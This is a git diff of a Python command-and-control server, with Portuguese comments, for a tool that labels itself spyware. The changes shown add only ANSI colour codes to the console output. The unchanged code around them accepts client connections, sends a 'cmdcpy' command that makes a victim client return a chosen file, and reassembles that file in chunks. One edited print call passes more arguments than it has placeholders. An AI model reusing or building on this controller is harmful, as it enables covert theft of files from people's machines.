@@ -20,6 +20,12 @@ if __name__ == "__main__":
     resto = None
     ext = None 
     recv_files = [None, None]
+    cores = {
+        'limpa':'\033[m',
+        'red':'\033[31m',
+        'green':'\033[32m',
+        'blue':'\033[34m'
+    }
 
     # Iniciando o seletor como padrão
     sel = selectors.DefaultSelector()
@@ -36,8 +42,8 @@ if __name__ == "__main__":
     # Registrando o 'stdin' (usuário digitando) com o selector
     sel.register(sys.stdin.fileno(), selectors.EVENT_READ)
 
+    print('{}Servidor Iniciado...{}'.format(cores['green'], cores['limpa']))
 
-    
     #################################
     # Loop Principal
     #################################
@@ -51,7 +57,7 @@ if __name__ == "__main__":
                     conn, addr = soc.accept()
                     conn.setblocking(False)
                     sel.register(conn, selectors.EVENT_READ)
-                    print('Nova conexão em {}'.format(key.fileobj))
+                    print('{}Nova conexão > {}{}'.format(cores['green'], key.fileobj, cores['limpa']))
 
                 # Se o Usuario Digitou Algo
                 elif key.fileobj == sys.stdin.fileno():
@@ -72,7 +78,7 @@ if __name__ == "__main__":
                         if data[5:8] == 'cpy':
                             conn.send(('cmdcpy' + data[9:]).encode())
                             name_arq = (data[9:len(data)-1])
-                            print('Arquivo Selecionado >> {}'.format(name_arq))
+                            print('{}Arquivo Selecionado > {}{}'.format(cores['blue'], cores['green'], name_arq, cores['limpa']))
                             # Abrindo arquivo com mesmo nome e guardando na posição 1
                             recv_files[0] = open(name_arq, 'wb')
                             recv_files[1] = None
@@ -112,7 +118,7 @@ if __name__ == "__main__":
 
                                 # Verificação de sanidade, este código não deveria ser executado
                                 if code != 'FIL':
-                                    print('Recebemos algo errado!')
+                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['limpa']))
 
                                 # Encontrando o tamanho do chunk
                                 csize = int(data[3:6].decode())
@@ -136,7 +142,7 @@ if __name__ == "__main__":
 
                             if recv_files[1] <= 0:
                                 recv_files[0].close()
-                                print('Arquivo recebido (em uma mensagem)!')
+                                print('{}Arquivo recebido (em uma mensagem)!{}'.format(cores['green'], cores['limpa']))
 
                         else:
                             # else recv_files[1] != None
@@ -149,7 +155,7 @@ if __name__ == "__main__":
 
                                 # Verificação de sanidade, este código não deveria ser executado
                                 if code != 'FIL':
-                                    print('Recebemos algo errado!')
+                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['limpa']))
 
                                 # Encontrando o tamanho do chunk
                                 csize = int(data[3:6].decode())
@@ -173,24 +179,24 @@ if __name__ == "__main__":
 
                             if recv_files[1] <= 0:
                                 recv_files[0].close()
-                                print('Arquivo recebido! (em várias mensagens)')
+                                print('{}Arquivo recebido! (em várias mensagens){}'.format(cores['green'], cores['limpa']))
 
                     # Se não for arquivo, ele mostra a resposta do cliente
                     else:
                         if not data:
-                            print('Cliente Desconectado > {}'.format(conn))
+                            print('{}Cliente Desconectado > {}{}'.format(cores['red'], conn, cores['limpa']))
                             sel.unregister(conn)
                             conn.close()
                             break
 
                         print('\n'
-                              '<<<===== Spyware (@) =====>>> \n'
-                              '{}\n'.format(data.decode()))
+                              '{}<<<===== Spyware (@) =====>>> {}\n'
+                              '{}\n'.format(cores['blue'], cores['green'], data.decode(), cores['limpa']))
         except:
 
             if ext == True:
                 exit()
                 break
             # Isso não irá desconectar os clientes... eu acho...
-            print('Error: Reiniciando Servidor!!!')
+            print('{}Error: Reiniciando Servidor!!!{}'.format(cores['red'], cores['limpa']))
             continue
